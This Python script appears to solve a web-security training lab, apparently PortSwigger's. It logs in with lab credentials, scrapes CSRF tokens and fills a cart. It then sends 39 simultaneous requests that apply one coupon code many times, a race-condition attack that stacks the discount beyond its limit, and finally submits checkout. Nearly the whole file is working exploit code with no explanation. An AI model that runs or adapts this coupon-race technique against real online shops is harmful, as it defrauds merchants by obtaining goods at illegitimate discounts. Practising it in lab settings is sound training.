import re
import sys
import requests
import aiohttp
import asyncio
from aiohttp import TCPConnector

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
cart_url = burp_url + '/cart'
add_cupon = burp_url + '/cart/coupon'

session = requests.Session()

response = session.get(login_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)
burp_data = {"csrf": csrf, "username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data)

burp_data = {"productId": "1", "redir": "PRODUCT", "quantity": "1"}
session.post(cart_url, data=burp_data)

response = session.get(cart_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)

burp_data = {"csrf": csrf, "coupon": "PROMO20"}

cookies = session.cookies.get_dict()

async def send_requests_in_batches(add_cupon, burp_data, num_requests, batch_size, cookies):
    connector = TCPConnector(limit=100)
    async with aiohttp.ClientSession(cookies=cookies, connector=connector) as aio_session:
        tasks = []
        for i in range(num_requests):
            tasks.append(aio_session.post(add_cupon, data=burp_data))
            if (i + 1) % batch_size == 0:
                await asyncio.gather(*tasks)
                tasks = []
        if tasks:
            await asyncio.gather(*tasks)

async def run_multiple_batches():
    await send_requests_in_batches(add_cupon, burp_data, 39, 39, cookies)

asyncio.run(run_multiple_batches())

r = session.get(cart_url)
print(r.text)

response = session.get(cart_url)
match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = match.group(1)

burp_data = {"csrf": csrf}
session.post(burp_url, data=burp_data)
